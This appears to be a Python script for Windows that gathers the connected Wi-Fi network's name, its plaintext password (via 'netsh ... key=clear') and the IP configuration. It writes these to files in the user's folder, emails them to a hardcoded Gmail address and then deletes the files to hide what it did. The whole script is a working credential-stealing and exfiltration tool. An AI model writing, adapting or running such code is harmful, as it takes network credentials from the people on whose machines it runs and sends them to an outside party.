import subprocess
import os
import send_to_email
import getpass

def run_command(command):
    p = subprocess.Popen(command,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT)
    return iter(p.stdout.readline, b'')

def write_console_txt(command, txt):
    use_command = command.split()
    net_report = open(txt, "a")
    for line in run_command(use_command):
        each_line = line
        net_report.write(each_line)
    net_report.close()

def parse_file(from_txt, to_txt, key, title):
    wanted_line = ""
    net_report = open(from_txt, "r")
    key_txt= open(to_txt, "a")
    if key == "IPv4":
        for line in net_report:
            if key in line:
                wanted_line = line
                wanted_line = wanted_line[39:]
                wanted_line = str(wanted_line).strip()
                key_txt.write(title + ": " + wanted_line + "\n")
    else:
        for line in net_report:
            if key in line:
                wanted_line = line
                wanted_line = wanted_line[29:]
                wanted_line = str(wanted_line).strip()
                key_txt.write(title + ": " + wanted_line + "\n")

    net_report.close()
    key_txt.close()
    return wanted_line

# gets the pc's current username
user_name = getpass.getuser()

full_report = "C:\Users\\"+user_name+"\\network_report.txt"
network = "C:\Users\\"+user_name+"\\wifi_report.txt"

# pulls up the pc's currently connected wifi information
command_one = 'netsh wlan show interfaces'
write_console_txt(command_one, full_report)
wifi_name = parse_file(full_report, network, "Profile", "SSID")

# pulls up the full stats on the wifi, including password
command_two = 'netsh wlan show profiles name="%s" key=clear' % wifi_name
write_console_txt(command_two, full_report)
wifi_password = parse_file(full_report, network, "Key", "Password")

# pulls up IP config information
command_three = 'ipconfig'
write_console_txt(command_three, full_report)
IP_address = parse_file(full_report, network, "IPv4", "IP Address")

# list of files to email
To_send = [full_report, network]

# emails the files
send_to_email.sendEmail("WIFI INFO", "t@g.com", "testprogramemail@gmail.com", "test", "Hey!", To_send)

# deletes files off of computer
for file_name in To_send:
    os.remove(file_name)
